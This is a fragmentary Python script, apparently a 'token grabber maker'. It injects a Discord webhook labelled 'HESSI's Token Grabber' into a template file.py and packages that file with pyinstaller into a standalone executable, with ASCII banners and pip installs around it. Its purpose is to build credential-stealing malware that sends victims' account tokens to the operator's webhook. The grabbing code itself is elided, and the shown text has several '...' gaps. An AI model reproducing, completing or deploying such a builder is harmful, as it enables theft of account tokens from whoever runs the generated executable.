...
os.system('cmd /c "title token grabber maker by Galactic-Kurisu"')
...
╚██████╔╝██║  ██║███████╗██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                               ...
                               made by : Galactic-Kurisu
                               
                                   """)
os.system('cmd /c "pip install colorama"')
if os.path.exists('C:\\Users\\' + username + '\\Appdata\\Local\\Programs\\Python\\Python39\\python.exe'):
  os.system('cmd /c "pip install pyinstaller"')

if os.path.exists('C:\\Users\\' + username + '\\Appdata\\Local\\Programs\\Python\\Python38\\python.exe'):
  os.system('cmd /c "pip install pyinstaller"')

if os.path.exists('C:\\Users\\' + username + '\\Appdata\\Local\\Programs\\Python\\Python37\\python.exe'):
  os.system('cmd /c "pip install pyinstaller"')

if os.path.exists('C:\\Users\\' + username + '\\Appdata\\Local\\Programs\\Python\\Python36\\python.exe'):
  os.system('cmd /c "pip install pyinstaller"')
...
def main():
    ...
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "HESSI's Token Grabber",
...
list_of_lines[219] = webhook

a_file = open("file.py", "w")
a_file.writelines(list_of_lines)
a_file.close()

os.system('cmd /c "pyinstaller file.py --onefile --distpath output"')

if os.path.exists("file.spec"):
  os.remove("file.spec")
...
╚██████╔╝██║  ██║███████╗██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                   ...
                                   """)
webbrowser.open('https://github.com/Galactic-Kurisu')
